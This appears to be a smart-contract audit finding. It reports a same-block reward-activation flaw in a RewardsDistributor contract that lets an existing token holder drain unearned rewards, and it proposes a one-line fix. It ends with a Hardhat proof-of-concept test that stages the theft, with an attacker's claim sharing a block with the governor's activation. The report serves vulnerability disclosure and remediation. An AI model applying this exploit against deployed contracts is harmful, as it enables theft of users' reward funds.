### Title
Uninitialized reward accounts receive `balanceOf(account)` during same-block reward activation - (File: contracts/RewardsDistributor.sol)

### Summary
`RewardsDistributor` initializes a newly enabled tracked token at `INITIAL_INDEX`, but `_calculateTokenDelta()` only maps a missing account index to `INITIAL_INDEX` when the token index is strictly greater than `INITIAL_INDEX`. During the activation block, an existing token holder can claim one reward token unit per tracked-token unit without any elapsed reward period. [1](#0-0) 

### Finding Description
When the governor or reward keeper first enables a token, `_updateTokenSpeed()` sets `tokenStates[token_]` to `{index: INITIAL_INDEX, timestamp: block.timestamp}` and pushes it into `tokens`. [2](#0-1)  If `claimRewards()` or `updateBeforeMintOrBurn()` is called in that same block, `_calculateTokenIndex()` returns no update because `block.timestamp - supplyState.timestamp == 0`, leaving the token index at `INITIAL_INDEX`. [3](#0-2)  `_calculateTokenDelta()` then leaves `accountIndexOf[token_][account_] == 0` unchanged because `_tokenIndex > INITIAL_INDEX` is false. [4](#0-3)  The resulting `_deltaIndex` is `1e18`, so `_tokensDelta = token_.balanceOf(account_).wadMul(1e18) = token_.balanceOf(account_)`. [5](#0-4)  `claimRewards()` writes this amount to `tokensAccruedOf` and transfers it when the distributor has enough reward-token balance. [6](#0-5) [7](#0-6) 

### Impact Explanation
An unprivileged account that already holds a newly reward-enabled `DepositToken` or `DebtToken` can immediately steal accrued reward funding. If the holder's tracked-token balance is at least the distributor's reward-token balance, the holder drains the full distributor balance; otherwise the holder receives their full tracked-token balance as unearned rewards. This is theft of unclaimed yield and breaks reward-accrual accounting.

### Likelihood Explanation
The exploit requires a reward token to be newly activated or reactivated while its stored index is still `INITIAL_INDEX`, followed by a same-block public claim. Attackers can monitor or bundle after `updateTokenSpeed()`, `updateTokenSpeeds()`, or keeper-initiated `syncTokenSpeed()`. No privileged role, malicious oracle, malformed token, or cross-contract reentrancy is required for the claim itself; the attacker needs only an existing tracked-token balance.

### Recommendation
Normalize an uninitialized account index whenever the token index is initialized, not only when it exceeds `INITIAL_INDEX`. For example, change the fallback to:

```solidity
// contracts/RewardsDistributor.sol
if (_accountIndex == 0 && _tokenIndex >= INITIAL_INDEX) {
    _accountIndex = INITIAL_INDEX;
}
```

Also add a same-block regression test covering reward activation followed by `claimRewards()` and `updateBeforeMintOrBurn()`.

### Proof of Concept

```typescript
// test/RewardDistributor.initialIndex.test.ts
import {expect} from 'chai'
import {ethers} from 'hardhat'
import {smock} from '@defi-wonderland/smock'

it('pays balanceOf(account) as rewards during activation block', async () => {
  const [governor, attacker] = await ethers.getSigners()

  const pool = await smock.fake('Pool')
  const reward = await smock.fake('ERC20')
  const tracked = await smock.fake('ERC20') // represents a DepositToken or DebtToken

  const RewardsDistributor = await ethers.getContractFactory('RewardsDistributor')
  const implementation = await RewardsDistributor.deploy()
  const init = implementation.interface.encodeFunctionData('initialize', [
    pool.address,
    reward.address,
  ])
  const Proxy = await ethers.getContractFactory(
    'contracts/dependencies/openzeppelin/proxy/ERC1967/ERC1967Proxy.sol:ERC1967Proxy'
  )
  const proxy = await Proxy.deploy(implementation.address, init)
  const distributor = RewardsDistributor.attach(proxy.address)

  pool.governor.returns(governor.address)
  pool.getRewardsDistributors.returns([distributor.address])
  pool.doesDebtTokenExist.returns(false)
  pool.doesDepositTokenExist.whenCalledWith(tracked.address).returns(true)

  // Existing holder and funded reward contract.
  await tracked.setVariable('balanceOf', {[attacker.address]: ethers.parseEther('1000')})
  await tracked.setVariable('totalSupply', ethers.parseEther('1000'))
  await reward.setVariable('balanceOf', {[distributor.address]: ethers.parseEther('500')})

  // Keep both transactions in one block so no reward time elapses.
  await ethers.provider.send('evm_setAutomine', [false])
  await distributor.connect(governor).updateTokenSpeed(tracked.address, 1)
  await distributor.connect(attacker).claimRewards(attacker.address)
  await ethers.provider.send('evm_mine')

  expect(await distributor.tokensAccruedOf(attacker.address)).eq(0)
  expect(await reward.balanceOf(attacker.address)).eq(ethers.parseEther('500'))
  expect(await reward.balanceOf(distributor.address)).eq(0)
})
```
